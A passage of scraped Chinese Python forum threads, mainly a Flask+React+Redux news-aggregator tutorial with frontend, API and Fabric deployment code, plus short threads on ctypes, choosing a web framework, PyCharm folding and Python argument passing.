要用到的头文件在这<a href=\"https://git.oschina.net/blacklin/codes/74tlbowzdy9fm1h8uq32r16\" rel=\"nofollow\">https://git.oschina.net/blacklin/codes/74tlbowzdy9fm1h8uq32r16</a></p>\n<p>我觉得可能是 python 的问题，但是就是不知道问题在哪。。。</p>\n</div></div>"], "reply": "5", "tittle": "同一个 DLL 用 C 调用其中一个函数和用 PYTHON 调用同一个函数，返回的结果不同", "comment": ["comPortName = ctypes.c_char_p()\r", "comPortName = \"\\\\\\\\.\\\\COM5\";\r", "---------------------------------------------------\r", "这一段 comPortName 最后又赋值成了 python 字符串， 而不是 c_char_p", " 我把这边改成 comPortName = ctypes.c_char_p(\"\\\\\\\\.\\\\COM5\") 后，结果没有改变", "最大的可能性是字节编码，不同", " 您觉得是传入的参数字节码有问题还是返回值的字节编码有问题？", " 我这个没有具体分析过案例，你需要自已排查一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>简介</h1>\n<p>我有时在 Web 上浏览信息时，会浏览 <a href=\"https://github.com/trending\" rel=\"nofollow\">Github Trending</a>, <a href=\"https://news.ycombinator.com/\" rel=\"nofollow\">Hacker News</a> 和 <a href=\"https://gold.xitu.io/\" rel=\"nofollow\">稀土掘金</a> 等技术社区的资讯或文章，但觉得逐个去看很费时又不灵活。后来我发现国外有一款叫 <a href=\"http://usepanda.com/\" rel=\"nofollow\">Panda</a> 的产品，它聚合了互联网大多数领域的信息，使用起来确实很不错，唯一的遗憾就是没有互联网中文领域的信息，于是我就萌生了一个想法：写个爬虫，把经常看的网站的资讯爬下来，并显示出来。</p>\n<p>有了想法，接下来就是要怎么实现的问题了。虽然有不少解决方法，但后来为了尝试使用 <a href=\"https://facebook.github.io/react/\" rel=\"nofollow\">React</a>，就采用了 Flask + React + Redux 的技术栈。其中：</p>\n<ul>\n<li>Flask 用于在后台提供 api 服务</li>\n<li>React 用于构建 UI</li>\n<li>Redux 用于数据流管理</li>\n</ul>\n<p>目前项目已经实现了基本功能，项目源码：<a href=\"https://github.com/ethan-funny/React-News-Board\" rel=\"nofollow\">Github 地址</a>。目前界面大概如下：</p>\n<p><img alt=\"home\" src=\"https://ooo.0o0.ooo/2016/12/03/5842c5876d8a2.png\"></p>\n<h1>前端开发</h1>\n<p>前端的开发主要涉及两大部分：<strong>React</strong> 和 <strong>Redux</strong>， React 作为「显示层」(View layer) 用， Redux 作为「数据层」(Model layer) 用。</p>\n<p>我们先总体了解一下 React+Redux 的基本工作流程，一图胜千言（该说的基本都在图里面了）：</p>\n<p><img alt=\"\" src=\"https://ooo.0o0.ooo/2016/12/03/5842c5ba617ce.png\"></p>\n<p>我们可以看到，<strong>整个数据流是单向循环的</strong>：</p>\n<pre><code>Store （存放状态） -&gt; View layer （显示状态） -&gt; Action -&gt; Reducer （处理动作）\n ^                                                        |\n |                                                        |\n --------------------返回新的 State-------------------------\n</code></pre>\n<p>其中：</p>\n<ul>\n<li>React 提供应用的 View 层，表现为组件，分为容器组件（ container ）和普通显示组件（ component ）；</li>\n<li>Redux 包含三个部分： Action ， Reducer 和 Store ：\n<ul>\n<li>Action 本质上是一个 JS 对象，它至少需要一个元素： type ，用于标识 action ；</li>\n<li>Middleware （中间件）用于在 Action 发起之后，到达 Reducer 之前做一些操作，比如异步 Action ， Api 请求等；</li>\n<li>Reducer 是一个函数：<code>(previousState, action) =&gt; newState</code>，可理解为动作的处理中心，处理各种动作并生成新的 state ，返回给 Store ；</li>\n<li>Store 是整个应用的状态管理中心，容器组件可以从 Store 中获取所需要的状态；</li>\n</ul>\n</li>\n</ul>\n<p>项目前端的源码在 client 目录中，下面是一些主要的目录：</p>\n<pre><code>client\n    ├── actions        # 各种 action\n    ├── components     # 普通显示组件\n    ├── containers     # 容器组件\n    ├── middleware     # 中间间，用于 api 请求\n    ├── reducers       # reducer 文件\n    ├── store          # store 配置文件\n</code></pre>\n<h2>React 开发</h2>\n<p>React 部分的开发主要涉及 container 和 component ：</p>\n<ul>\n<li>container 负责接收 store 中的 state 和发送 action ，一般和 store 直接连接；</li>\n<li>component 位于 container 的内部，它们一般不和 store 直接连接，而是从父组件 container 获取数据作为 props ，所有操作也是通过回调完成， component 一般会多次使用；</li>\n</ul>\n<p>在本项目中， container 对应的原型如下：</p>\n<p><img alt=\"container\" src=\"https://ooo.0o0.ooo/2016/12/03/5842de699bd3b.png\"></p>\n<p>而 component 则主要有两个：一个是选择组件，一个是信息显示组件，如下：</p>\n<img src=\"https://ooo.0o0.ooo/2016/12/03/5842e03ed8944.png\">\n<img src=\"https://ooo.0o0.ooo/2016/12/03/5842e04e73578.png\">\n<p>这些 component 会被多次使用。</p>\n<p>下面，我们主要看一下容器组件 (对应 App.js) 的代码（只显示部分重要的代码）：</p>\n<pre><code>import React, { Component, PropTypes } from 'react';\nimport { connect } from 'react-redux';\n\nimport Posts from '../../components/Posts/Posts';\nimport Picker from '../../components/Picker/Picker';\nimport { fetchNews, selectItem } from '../../actions';\n\nrequire('./App.scss');\n\nclass App extends Component {\n  constructor(props) {\n    super(props);\n    this.handleChange = this.handleChange.bind(this);\n  }\n  \n  componentDidMount() {\n    for (const value of this.props.selectors) {\n      this.props.dispatch(fetchNews(value.item, value.boardId));\n    }\n  }\n  \n  componentWillReceiveProps(nextProps) {\n    for (const value of nextProps.selectors) {\n      if (value.item !== this.props.selectors[value.boardId].item) {\n        nextProps.dispatch(fetchNews(value.item, value.boardId));\n      }\n    }\n  }\n  \n  handleChange(nextItem, id) {\n    this.props.dispatch(selectItem(nextItem, id));\n  }\n  \n  render() {\n    const boards = [];\n    for (const value of this.props.selectors) {\n      boards.push(value.boardId);\n    }\n    const options = ['Github', 'Hacker News', 'Segment Fault', '开发者头条', '伯乐头条'];\n    return (\n      &lt;div className=\"mega\"&gt;\n        &lt;main&gt;\n          &lt;div className=\"desk-container\"&gt;\n            {\n              boards.map((board, i) =&gt;\n                &lt;div className=\"desk\" style={{ opacity: 1 }} key={i}&gt;\n                  &lt;Picker value={this.props.selectors[board].item}\n                    onChange={this.handleChange}\n                    options={options}\n                    id={board}\n                  /&gt;\n                  &lt;Posts\n                    isFetching={this.props.news[board].isFetching}\n                    postList={this.props.news[board].posts}\n                    id={board}\n                  /&gt;\n                &lt;/div&gt;\n              )\n            }\n          &lt;/div&gt;\n        &lt;/main&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n\nfunction mapStateToProps(state) {\n  return {\n    news: state.news,\n    selectors: state.selectors,\n  };\n}\n\nexport default connect(mapStateToProps)(App);\n</code></pre>\n<p>其中，</p>\n<ul>\n<li><code>constructor(props)</code> 是一个构造函数，在创建组件的时候会被调用一次；</li>\n<li><code>componentDidMount()</code> 这个方法在组件加载完毕之后会被调用一次；</li>\n<li><code>componentWillReceiveProps()</code> 这个方法在组件接收到一个新的 prop 时会被执行；</li>\n</ul>\n<p>上面这几个函数是组件生命周期（ react component lifecycle ）函数，更多的组件生命周期函数可<a href=\"https://facebook.github.io/react/docs/react-component.html#the-component-lifecycle\" rel=\"nofollow\">在此</a>查看。</p>\n<ul>\n<li><code>react-redux</code> 这个库的作用从名字就可看出，它用于连接 react 和 redux ，也就是连接容器组件和 store ；</li>\n<li><code>mapStateToProps</code> 这个函数用于建立一个从（外部的） state 对象到 UI 组件的 props 对象的映射关系，它会订阅 Store 中的 state ，每当有 state 更新时，它就会自动执行，重新计算 UI 组件的参数，从而触发 UI 组件的重新渲染；</li>\n</ul>\n<h2>Redux 开发</h2>\n<p>上文说过， Redux 部分的开发主要包含： action ， reducer 和 store ，其中， store 是应用的状态管理中心，当收到新的 state 时，会触发组件重新渲染， reducer 是应用的动作处理中心，负责处理动作并产生新的状态，将其返回给 store 。</p>\n<p>在本项目中，有两个 action ，一个是站点选择（如 Github ， Hacker News)，另一个是信息获取， action 的部分代码如下：</p>\n<pre><code>export const FETCH_NEWS = 'FETCH_NEWS';\nexport const SELECT_ITEM = 'SELECT_ITEM';\n\nexport function selectItem(item, id) {\n  return {\n    type: SELECT_ITEM,\n    item,\n    id,\n  };\n}\n\nexport function fetchNews(item, id) {\n  switch (item) {\n    case 'Github':\n      return {\n        type: FETCH_NEWS,\n        api: `/api/github/repo_list`,\n        method: 'GET',\n        id,\n      };\n    case 'Segment Fault':\n      return {\n        type: FETCH_NEWS,\n        api: `/api/segmentfault/blogs`,\n        method: 'GET',\n        id,\n      };\n    default:\n      return {};\n  }\n}\n</code></pre>\n<p>可以看到， action 就是一个普通的 JS 对象，它有一个属性 <code>type</code> 是必须的，用来标识 action 。</p>\n<p>reducer 是一个含有 switch 的函数，接收当前 state 和 action 作为参数，返回一个新的 state ，比如：</p>\n<pre><code>import { SELECT_ITEM } from '../actions';\nimport _ from 'lodash';\n\nconst initialState = [\n  {\n    item: 'Github',\n    boardId: 0,\n  },\n  {\n    item: 'Hacker News',\n    boardId: 1,\n  }\n];\n\nexport default function reducer(state = initialState, action = {}) {\n  switch (action.type) {\n    case SELECT_ITEM:\n      return _.sortBy([\n        {\n          item: action.item,\n          boardId: action.id,\n        },\n        ...state.filter(element =&gt;\n            element.boardId !== action.id\n        ),\n      ], 'boardId');\n    default:\n      return state;\n  }\n}\n</code></pre>\n<p>再来看一下 store:</p>\n<pre><code>import { createStore, applyMiddleware, compose } from 'redux';\nimport thunk from 'redux-thunk';\nimport api from '../middleware/api';\nimport rootReducer from '../reducers';\n\nconst finalCreateStore = compose(\n  applyMiddleware(thunk),\n  applyMiddleware(api)\n)(createStore);\n\nexport default function configureStore(initialState) {\n  return finalCreateStore(rootReducer, initialState);\n}\n</code></pre>\n<p>其中，<code>applyMiddleware()</code> 用于告诉 redux 需要用到那些中间件，比如异步操作需要用到 thunk 中间件，还有 api 请求需要用到我们自己写的中间件。</p>\n<h1>后端开发</h1>\n<p>后端的开发主要是爬虫，目前的爬虫比较简单，基本上是静态页面的爬虫，主要就是 HTML 解析和提取。如果要爬取<a href=\"https://gold.xitu.io/\" rel=\"nofollow\">稀土掘金</a>和<a href=\"https://zhuanlan.zhihu.com/\" rel=\"nofollow\">知乎专栏</a>等网站，可能会涉及到<strong>登录验证</strong>，<strong>抵御反爬虫</strong>等机制，后续也将进一步开发。</p>\n<p>后端的代码在 server 目录：</p>\n<pre><code>server\n    ├── __init__.py\n    ├── app.py            # 创建 app\n    ├── configs.py        # 配置文件\n    ├── controllers       # 提供 api 服务\n    └── spiders           # 爬虫文件夹，几个站点的爬虫\n</code></pre>\n<p>后端通过 Flask 以 api 的形式给前端提供数据，下面是部分代码：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nimport flask\nfrom flask import jsonify\n\nfrom server.spiders.github_trend import GitHubTrend\nfrom server.spiders.toutiao import Toutiao\nfrom server.spiders.segmentfault import SegmentFault\nfrom server.spiders.jobbole import Jobbole\n\nnews_bp = flask.Blueprint(\n    'news',\n    __name__,\n    url_prefix='/api'\n)\n\n@news_bp.route('/github/repo_list', methods=['GET'])\ndef get_github_trend():\n    gh_trend = GitHubTrend()\n    gh_trend_list = gh_trend.get_trend_list()\n\n    return jsonify(\n        message='OK',\n        data=gh_trend_list\n    )\n\n@news_bp.route('/toutiao/posts', methods=['GET'])\ndef get_toutiao_posts():\n    toutiao = Toutiao()\n    post_list = toutiao.get_posts()\n\n    return jsonify(\n        message='OK',\n        data=post_list\n    )\n\n@news_bp.route('/segmentfault/blogs', methods=['GET'])\ndef get_segmentfault_blogs():\n    sf = SegmentFault()\n    blogs = sf.get_blogs()\n\n    return jsonify(\n        message='OK',\n        data=blogs\n    )\n\n@news_bp.route('/jobbole/news', methods=['GET'])\ndef get_jobbole_news():\n    jobbole = Jobbole()\n    blogs = jobbole.get_news()\n\n    return jsonify(\n        message='OK',\n        data=blogs\n    )\n</code></pre>\n<h1>部署</h1>\n<p>本项目的部署采用 <code>nginx+gunicorn+supervisor</code> 的方式，其中：</p>\n<ul>\n<li><a href=\"https://www.nginx.com/\" rel=\"nofollow\">nginx</a> 用来做反向代理服务器：通过接收 Internet 上的连接请求，将请求转发给内网中的目标服务器，再将从目标服务器得到的结果返回给 Internet 上请求连接的客户端（比如浏览器）；</li>\n<li><a href=\"http://gunicorn.org/\" rel=\"nofollow\">gunicorn</a> 是一个高效的 Python WSGI Server ，我们通常用它来运行 WSGI (Web Server Gateway Interface ， Web 服务器网关接口) 应用（比如本项目的 Flask 应用）；</li>\n<li><a href=\"http://supervisord.org/\" rel=\"nofollow\">supervisor</a> 是一个进程管理工具，可以很方便地启动、关闭和重启进程等；</li>\n</ul>\n<p>项目部署需要用到的文件在 deploy 目录下：</p>\n<pre><code>deploy\n    ├── fabfile.py          # 自动部署脚本\n    ├── nginx.conf          # nginx 通用配置文件\n    ├── nginx_geekvi.conf   # 站点配置文件\n    └── supervisor.conf     # supervisor 配置文件\n</code></pre>\n<p>本项目采用了 <a href=\"http://www.fabfile.org/\" rel=\"nofollow\">Fabric</a> 自动部署神器，它允许我们不用直接登录服务器就可以在本地执行远程操作，比如安装软件，删除文件等。</p>\n<p><code><a href=\"http://fabfile.py\" rel=\"nofollow\">fabfile.py</a></code> 文件的部分代码如下：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nimport os\nfrom contextlib import contextmanager\nfrom fabric.api import run, env, sudo, prefix, cd, settings, local, lcd\nfrom fabric.colors import green, blue\nfrom fabric.contrib.files import exists\n\nenv.hosts = ['deploy@111.222.333.44:12345']\nenv.key_filename = '~/.ssh/id_rsa'\n# env.password = '12345678'\n\n# path on server\nDEPLOY_DIR = '/home/deploy/www'\nPROJECT_DIR = os.path.join(DEPLOY_DIR, 'react-news-board')\nCONFIG_DIR = os.path.join(PROJECT_DIR, 'deploy')\nLOG_DIR = os.path.join(DEPLOY_DIR, 'logs')\nVENV_DIR = os.path.join(DEPLOY_DIR, 'venv')\nVENV_PATH = os.path.join(VENV_DIR, 'bin/activate')\n\n# path on local\nPROJECT_LOCAL_DIR = '/Users/Ethan/Documents/Code/react-news-board'\n\nGITHUB_PATH = 'https://github.com/ethan-funny/react-news-board'\n\n@contextmanager\ndef source_virtualenv():\n    with prefix(\"source {}\".format(VENV_PATH)):\n        yield\n\ndef build():\n    with lcd(\"{}/client\".format(PROJECT_LOCAL_DIR)):\n        local(\"npm run build\")\n\ndef deploy():\n    print green(\"Start to Deploy the Project\")\n    print green(\"=\" * 40)\n\n    # 1. Create directory\n    print blue(\"create the deploy directory\")\n    print blue(\"*\" * 40)\n    mkdir(path=DEPLOY_DIR)\n    mkdir(path=LOG_DIR)\n\n    # 2. Get source code\n    print blue(\"get the source code from remote\")\n    print blue(\"*\" * 40)\n    with cd(DEPLOY_DIR):\n        with settings(warn_only=True):\n            rm(path=PROJECT_DIR)\n        run(\"git clone {}\".format(GITHUB_PATH))\n\n    # 3. Install python virtualenv\n    print blue(\"install the virtualenv\")\n    print blue(\"*\" * 40)\n    sudo(\"apt-get install python-virtualenv\")\n\n    # 4. Install nginx\n    print blue(\"install the nginx\")\n    print blue(\"*\" * 40)\n    sudo(\"apt-get install nginx\")\n    sudo(\"cp {}/nginx.conf /etc/nginx/\".format(CONFIG_DIR))\n    sudo(\"cp {}/nginx_geekvi.conf /etc/nginx/sites-enabled/\".format(CONFIG_DIR))\n\n    # 5. Install python requirements\n    with cd(DEPLOY_DIR):\n        if not exists(VENV_DIR):\n            run(\"virtualenv {}\".format(VENV_DIR))\n        with settings(warn_only=True):\n            with source_virtualenv():\n                sudo(\"pip install -r {}/requirements.txt\".format(PROJECT_DIR))\n\n    # 6. Config supervisor\n    sudo(\"supervisord -c {}/supervisor.conf\".format(CONFIG_DIR))\n    sudo(\"supervisorctl -c {}/supervisor.conf reload\".format(CONFIG_DIR))\n    sudo(\"supervisorctl -c {}/supervisor.conf status\".format(CONFIG_DIR))\n    sudo(\"supervisorctl -c {}/supervisor.conf start all\".format(CONFIG_DIR))\n</code></pre>\n<p>其中，<code>env.hosts</code> 指定了远程服务器，<code>env.key_filename</code> 指定了私钥的路径，这样我们就可以免密码登录服务器了。根据实际情况修改上面的相关参数，比如服务器地址，用户名，服务器端口和项目路径等，就可以使用了。注意，在部署之前，我们应该先对前端的资源进行加载和构建，在 deploy 目录使用如下命令：</p>\n<pre><code>$ fab build\n</code></pre>\n<p>当然，你也可以直接到 client 目录下，运行命令：</p>\n<pre><code>$ npm run build\n</code></pre>\n<p>如果构建没有出现错误，就可以进行部署了，在 deploy 目录使用如下命令进行部署：</p>\n<pre><code>$ fab deploy\n</code></pre>\n<h1>总结</h1>\n<ul>\n<li>\n<p>本项目前端使用 <code>React+Redux</code>，后端使用 <code>Flask</code>，这也算是一种比较典型的开发方式了，当然，你也可以使用 <code>Node.js</code> 来做后端。</p>\n</li>\n<li>\n<p>前端的开发需要知道数据的流向：</p>\n</li>\n</ul>\n<p><img alt=\"flow\" src=\"https://ooo.0o0.ooo/2016/12/04/5843ad042ae8f.png\"></p>\n<ul>\n<li>后端的开发主要是爬虫， Flask 在本项目只是作为一个后台框架，对外提供 api 服务；</li>\n</ul>\n<h1>参考资料</h1>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000007589848\" rel=\"nofollow\">react+redux+router 异步数据获取教程</a></li>\n<li><a href=\"https://qiutc.me/post/redux-%E5%A4%A7%E6%B3%95%E5%A5%BD-%E2%80%94%E2%80%94-%E5%85%A5%E9%97%A8%E5%AE%9E%E4%BE%8B-TodoList.html\" rel=\"nofollow\">redux 大法好 —— 入门实例 TodoList</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000005356568\" rel=\"nofollow\">实例讲解基于 React+Redux 的前端开发流程</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000004660725#articleHeader2\" rel=\"nofollow\">玩物圈前端技术栈总结（ React+Redux ）</a></li>\n<li><a href=\"https://funhacks.gitbooks.io/head-first-flask/content/chapter02/section2.10.html\" rel=\"nofollow\">部署 · head-first-flask</a></li>\n</ul>\n</div></div>"], "reply": "38", "tittle": "实例讲解基于 Flask+React 的全栈开发和部署", "comment": ["太赞了.!", "mark.", "赞！建议是否可以缓存爬取结果， 不用每次请求都去爬取", "good job!", " ，之前是有这么考虑的，但后来为了能实时爬取，就想搁着了，这个后面我会继续优化一下，谢谢提议~", "这文档，赏心悦目～", "非常棒！这样从前到后一条龙很完整，后端爬虫再完善下，学习了！", " ，谢谢！", " ，谢谢！", "挺好的", "很赞，👍，", "赞！马一个。", "写得实在赞，很明显能看出大大是用心在写作。", " 可以用 FLASK-CACHE", " ，谢谢！", "太赞", "赞！", "感谢！ mark", "赞！文档咋就写得这么好呢", "mark", "赞！菜鸟顺便问一下，前端的工作流程图制作软件是什么？", "未入门的 Python 爱好者收藏下", "不错", " ，我是使用 macOS 上的 OmniGraffle ，如果你用 windows ，可以考虑 Visio 。", " ，谢谢!", " ，谢谢", " ，谢谢!", "mark", "Awesome!!!", "前端每过一年复杂度乘 2", " 哈哈哈哈哈", "不错，我也有这个想法。👍", "看着舒服，文档写的好，代码质量也有保障。", " ，谢谢！", "厉害了，感谢。", "很棒，赞一个", " , @", " ，谢谢！", "棒！"]},
{"content": ["<div class=\"topic_content\">web.py flask tornado Django 自己玩的小项目选哪个呢</div>"], "reply": "83", "tittle": "Python 的 web 框架哪个好呢", "comment": ["django", "tornado", "Flask 不服憋着", "引战贴, 火钳流明", "前三楼齐了，看你怎么选", "我选 Flask ，不服就自己想到服。", "flask", "flask+1", "凑热闹  web.py ～\r", " 可惜没再更新了", "flask", "uliweb💣", "php ，还有谁不服", "小项目还是 flask 吧。", "django", "django +1", "Flask", "bottle\r", "有人用过没", "目前用过 Django 和 Flask ， Django 算是一步到位吧， Flask 可以各种扩展。看你需求来选吧，只是做一个 RESTful API 的话，用 Flask 就够了，要做大一些的项目， Django 功能更齐全。", "Django ，大而全", "Flask+1", "PHP +1", "odoo", "django 套路熟悉了之后非常方便， admin 模块不容小视。", "严肃点做就 tornado", "Flask 爱咋咋地", " R U Serious ？ PHP ？", "tornado", "我用 flask 加扩展到最后都怀疑自己用的是 django  手动滑稽", "django 大而全。\r", "\r", "flask 小而精。\r", "\r", "说真的， flask 可以学到很多东西。\r", "之后，用 django 可以节省很多时间。\r", "\r", "所以，学习的话 flask 入手。\r", "\r", "反正前三楼说的都要学。", "习惯了 tornado", "aiohttp.web", "看你的需求，小项目有多小？\r", "Django 五脏俱全， Flask 需要很多第三方扩展。", "django .. 别作死用别的。。", "我还是推荐 Tornado\r", "\r", "Flask 一直说自己很优雅，但是我觉得很多地方用起来并不优雅，举几个例子：\r", "主要觉得不好的地方在于 view 是使用函数实现而不是类\r", "1. 在一个函数里面如果要同事处理 get 和 post 请求，就要使用 if 判断，\r", "if request.method == 'POST':\r", "    pass\r", "elif request.method == 'GET':\r", "    pass\r", "\r", "这很明显不够优雅啊，应该分开处理啊， Tornado 用类来实现 view GET 和 POST 分别用不同的函数处理，多么好啊。\r", "\r", "2. 就是 before_request 的方式\r", "如果想实现访问鉴权的话，写到 app.before_request 装饰的函数里，但是他是全局的，如果一些 view 不需要鉴权，那又得 if 判断了， blueprint 也有 before_request ，但是写起来总是不够方便，而 Tornado 就可以用多重继承， Mixin 等方式，很方便啊\r", "\r", "3. 就是在 view 嵌套函数\r", "嵌套函数倒没什么问题，但是大量使用的话总觉得不够优雅吧，类方法才够优雅啊\r", "\r", "当然，上面的疑问也可能是我对 flask 不够了解导致，如果又更好的实现，欢迎大家讨论。", " 手动滑稽，我当初用 flask 的时候也有同感", " before_request 这种钩子不方便么？能举个小例子说明一下 Tornado 怎么处理的么，我也一直觉得 Flask 有的地方处理蛮繁琐的，但又没有接触过其他框架，所以无从比较。", " 我鉴权写个装饰器挂在 get  post put 之类的方法上上面即可。", "tornado 有出版的教程，纯新手适合", "新手 flask ，上手很快，到后面了， django 其实也挺好的", " \r", "Tornado 就可以用多重继承， Mixin 等方式\r", " \r", "装饰器方式鉴权确实是一种方式，但是我考虑倒一种场景：\r", "如果绝大多数 view 都需要鉴权，而不需要鉴权的就几个（比如后台系统，一般只有注册和登录不需要鉴权），那这个装饰器是不是就不太好了，而 Tornado 只需要为少数不需要鉴权的 view 实现个基类就好了，而不需要去处理大多数", " 就猜到又是你😂", "必须 Django 哇", " \r", "\r", "关于优雅的处理 get ， post 方法。可以使用 MethodView 。\r", "\r", "至于后台网站那种大部分都要鉴权的，可以自己实现 View 类，和 tornado 差不多。", " 奇葩", "php", "用 tornado 就要有一切向异步看齐的准备，再选其他涉及到 IO 操作的包时就疼了", "Django", " django 也能用 Mixin 模式", "熟悉哪个用哪个。都不熟悉用 Django ，文档齐全，使用方便。", "Flask or Django", " flask 实现很简单啊,使用 MethodView 优雅的处理 get,post,put,delete,继承 MethodView 写一个公共的基类,用 decorators = ()代替 before_request ,不需要鉴权的继承原有的 MethodView\r", "\r", "ps:一直想不通 flask-restful 有什么用,原生 flask 已自带 MethodView", "小项目用 flask,大的 django,tornado 没用过不清楚，听说性能最好", " 如果是这样的话...我感觉 symfony 的路由组件很强大，同时也足够优雅了", "django 可以节省时间，所以我也准备从 web.py 转过来", "Hug +1", "nodejs express ....", " php 都成 python 框架了 hhh ，这是 php 被黑的最惨的一次", " \r", " \r", "感谢两位，我明天看下 MethodView", "自己玩小项目当然选 django ，主要是做项目快。什么都给你集成好了、\r", "有想学 django 的朋友，可以看我这个贴\r", "其实用 nodejs 也挺不错的", "必须 dj 啊", "Flask + 1", "Flask: Vine, Netflix, Reddit, Lyft\r", "Django: Instagram, Pinterest, Coursera\r", "\r", "Actually, it does not matter. Companies heavily modify web frameworks to suit their needs.", "相比 flask ， django 集成的 db 层是最大优势", " GET POST 可以的啊\r", ".route('/', methods=['GET'])\r", ".route('/', methods=['POST'])\r", "两个函数名不一样就行\r", "我经常这么用", "bottle +1\r", "相当于光杆的 flask ，做 RESTful 性能比 flask 好（ flask 多了一层 werkzeug ）。当然要做更多的功能就略不方便了，毕竟没有 flask 那么多现成的扩展。", "自己用了就知道了。", "有用 pylons (pyramid)框架的童鞋么？", " No, reddit use pylons (pyramid)", "Django 妥妥的，性能基本上不用管，自己玩的小项目做的出来才的基础上比较安全才是王道，性能什么的等你到了纠结的份上直接扩 VPS 就好了。我 VPS 一个月扩个 70 刀的方案性能高的不要不要的了，但是如果你一样的情况下找码农帮你优化代码，不到 500 人民币你应该就请的到学生。所以先别来纠结性能，易用性才是王道", "最近的项目在用 Hug ， 然后配 Pony ORM\r", "基于 Python3 （支持 Type annotation ），作为新的微框架感觉设计上相对于 Flask 更符合直觉。\r", "嗯嗯，所以我推荐 Flask （。", " 同感。我朋友也一直吐槽，说装那么多扩展之后，这不就是 Django 了吗，那不如一开始就用 Django 哈哈哈哈。感觉也是应用场景的问题吧，一开始可以预见需要大量扩展才能完成的，那肯定不是什么小的项目了，肯定会优先考虑 Flask 之外的框架的。", "Django 文档阔以\r", "\r", "现在觉得开源项目，无论本身技术多牛，传播的时候，对于用户和第三方开发者都是黑盒，文档所描述和暴露的功能，直接决定它对于用户的价值。如果文档为 0 ，那么价值也不会高到哪里去。\r", "\r", "文档===价值\r", "\r", "Django 文档不错\r", "\r", "其他没研究过，下次去膜拜膜拜", "自己做小项目 Django 挺好的，不知道现在什么版本了， 1.5-1.6 版本玩过，做了个小的音乐后台管理，后来转 java 了", "  这个框架看了下文档，真的很符合直觉，代码即文档。在使用过程中，坑多吗？有没有成熟的使用案例？", "LZ 应该没使用过这些框架吧，如果接触过的话，就不会问了。\r", "其实都有坑，没有哪个是完美的。\r", "flask 和 Django 的网络文档比较齐全，我也用这两个，不过都有很多坑，哪怕你是对着文档敲的代码，你也会遇到各式各样的奇葩问题。", "每个框架都有它的特点和存在的价值，个人喜欢 Tornado 和 Flask 。为什么推荐 Tornado 的人这么少？", "用的是个冷门的: falcon", " 你是认真的？", " 用的时候感觉项目文档太少所以比较担心。\r", "\r", "目前遇到过的问题是缺乏对于 auto-reload 的支持（ ", " ），以及写文件上传业务时候碰到过一个也是近版本才修复的一个 issue （ ", " ）。\r", "\r", "是用来写的内部系统，因为后端比较薄，所以扩展之类写得很少。\r", "\r", "总体开发的个人体验还是比 Flask 好一些的，建议一些个人项目可以玩票尝试一下。", "个人开发者，刚交差一个项目，换了 flask/django/bottle 三个框架\r", "开始用的 flask \r", "发现要装的插件有点多，而且目标环境里有个库正好依赖 django\r", "于是换了 django （从头学习的）\r", "发现 django 要配的配置文件有点多，写起来好麻烦~而且我不喜欢 django 的数据层和模版层\r", "刚好反思了下项目不涉及大量数据库操作，甚至可以不需要数据库，简化了设计架构后\r", "直接转了 bottle ，当 RESTful 服务器\r", "后来有 websocket 需求，而 WSGI 类的 python 框架在这方面非常弱，于是想转 tornado\r", "正准备开 git 分支时抽了自己巴掌，做什么死啊，你是做项目还是做调研？\r", "就这么 bottle 交差了\r", "\r", "\r", "回想起来，还是 flask 舒服。可能学会 django 后会更安逸些，但是实在受不了 django 自带全家老小式的配置文件，时时刻刻需要看文档，不然就进坑里了。而 flask 和 bottle 这类东西，框架本身替你完成的工作不多，反而改配置的思维负担小了很多。而且 jinja 、 sqlalchemy 这种东西不止做 flask 用，在其他地方也用的到，学到等于赚到。\r", "至于 bottle 在极端需要可部署性的情况下还是很美好的，毕竟单文件。", " 用了 3 年了，从 7 到现在的 10", " \r", "1. 在一个函数里面如果要同事处理 get 和 post 请求，就要使用 if 判断， \r", "为什么要用一个函数处理呢？\r", " \r", "2. 就是 before_request 的方式 \r", "抽象程度不够， 不应该在 before_request 里直接处理 view ， 可以定义一个请求处理器，除了决定是否可以鉴权， 还可以决定是否不需要控制器， 是否不需要 view ， 等等各种操作。\r", "3. 就是在 view 嵌套函数 \r", "嵌套函数倒没什么问题，但是大量使用的话总觉得不够优雅吧，类方法才够优雅啊，\r", "此条不懂。\r", "\r", "注： 以上都是我胡扯的， 我根本不会 python ， - -。 这些是 symfony httpKernel 组件的做法。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ctrl+shift+数字键+:展开所有的折叠<br>\nctr+shift+数字键-:收缩所有折叠<br>\n我想说的是,python 代码中,折叠的层级可以有多级或者说折叠的深度不同.<br>\n如上两个快捷方式可以快速折叠全部代码,但都不能控制折叠或展开的深度.<br>\n比如我要全部折叠到一层深度.<br>\n请问我该怎么操作呢?<br>\n多谢您的回复!</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "pycharm 是否可以设置全部折叠代码的层级?", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>当我们在 Python 中创建一个 variable 的时候，很多时候我们会给 variable 一个名字：</p>\n<pre><code>myList = [1,2]\n</code></pre>\n<p>我的理解（很可能是错误的）是，系统会分配一些空间给我们的<code>[1,2]</code>，然后还会有一个 reference<code>myList</code>，指向<code>[1,2]</code>. 现在的问题是，假设我们有一个函数，它的参数是 list ：</p>\n<pre><code>def func(myList):\n  return 0\n</code></pre>\n<p>当我们输入<code>func([1,2])</code>的时候， Python 如何保存<code>[1,2]</code>这个东西？</p>\n</div></div>"], "reply": "4", "tittle": "在 Python 的解释器中输入 func1([1,2])的时候究竟发生了什么？", "comment": ["刚反应过来，这是个无聊的问题，大家无视吧……", "在栈里创建[1, 2]，然后让 myList 作为它的引用。", "如果你想了解 Python 是怎样执行这段代码的，可以去看 Python 的实现。不过可能需要很多 prerequisites ，比如编译原理等知识。", "推荐你玩玩这个网站， "]},
